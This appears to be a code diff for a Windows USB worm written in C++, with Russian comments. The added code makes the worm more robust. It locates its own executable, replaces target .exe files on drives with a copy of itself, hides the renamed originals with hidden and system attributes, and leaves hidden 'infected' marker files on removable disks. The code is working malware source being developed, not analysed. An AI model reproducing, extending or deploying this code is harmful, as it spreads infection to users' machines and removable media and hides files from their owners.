@@ -3,14 +3,37 @@
 #include <windows.h>
 #include <set>
 
+//std::wstring get_own_path() {
+//    wchar_t buffer[MAX_PATH];
+//    DWORD result = GetModuleFileNameW(NULL, buffer, MAX_PATH);
+//    if (result == 0 || result == MAX_PATH) {
+//        return L"";
+//    }
+//    return std::wstring(buffer);
+//}
+
 std::wstring get_own_path() {
-    wchar_t buffer[MAX_PATH];
-    DWORD result = GetModuleFileNameW(NULL, buffer, MAX_PATH);
-    if (result == 0 || result == MAX_PATH) {
-        return L"";
+    std::wstring path;
+    DWORD size = MAX_PATH;
+    while (true) {
+        path.resize(size);
+        DWORD result = GetModuleFileNameW(NULL, &path[0], size);
+        if (result == 0) {
+            wcerr << L"[Ошибка] GetModuleFileNameW вернул 0, код ошибки: " << GetLastError() << endl;
+            return L"";
+        }
+        if (result < size) {
+            path.resize(result);
+            return path;
+        }
+        size *= 2;
     }
-    return std::wstring(buffer);
 }
+
+
+
+
+
 
 std::wstring get_drive_root_from_path(const std::wstring& full_path) {
     if (full_path.size() < 3 || full_path[1] != L':' || full_path[2] != L'\\') {
@@ -306,6 +329,7 @@ void worm::replicate_files(int iteration)
                     if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
                         std::wcerr << L"Ошибка SetFileAttributesW: " << GetLastError() << L"\n";
                     }
+                    
                 }
                 else {
                     std::wcerr << L"Ошибка GetFileAttributesW: " << GetLastError() << L"\n";
@@ -374,23 +398,43 @@ void worm::process_all_removable_disks()
     }
 }
 
+
 void worm::hide_and_replace_exe(const fs::path& target_exe, const std::wstring& worm_path)
 {
+    if (fs::equivalent(target_exe, worm_path)) {
+        return;
+    }
 
-    // Сброс всех атрибутов (включая HIDDEN, SYSTEM, READONLY)
     SetFileAttributesW(target_exe.c_str(), FILE_ATTRIBUTE_NORMAL);
-    // Генерация уникального имени для оригинала
+
     std::wstring unique_suffix = generate_unique_suffix();
     fs::path backup = target_exe;
     backup.replace_filename(target_exe.stem().wstring() + L"_" + unique_suffix + target_exe.extension().wstring());
+
     fs::rename(target_exe, backup);
-    CopyFileW(worm_path.c_str(), target_exe.c_str(), FALSE);
-    // Установка скрытых атрибутов для оригинала
+
+    if (!fs::exists(worm_path)) {
+        if (fs::exists(backup)) {
+            fs::rename(backup, target_exe);
+        }
+        return;
+    }
+
+    if (!CopyFileW(worm_path.c_str(), target_exe.c_str(), FALSE)) {
+        if (fs::exists(backup)) {
+            fs::rename(backup, target_exe);
+        }
+        return;
+    }
+
     SetFileAttributesW(backup.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
-
     infected_dir(get_drive_root_from_path(target_exe)); // добавляем скрытый файл, чтобы не заражать флешку несколько раз
-
 }
+
+
+
+
+
 
 bool worm::infected_dir(const wstring& dir_path)
 {
@@ -400,6 +444,7 @@ bool worm::infected_dir(const wstring& dir_path)
     marker << "infected";
     marker.close();
     SetFileAttributes(full_name_to_file.c_str(), 0x2 | 0x4);
+    
     return true;
 }
 
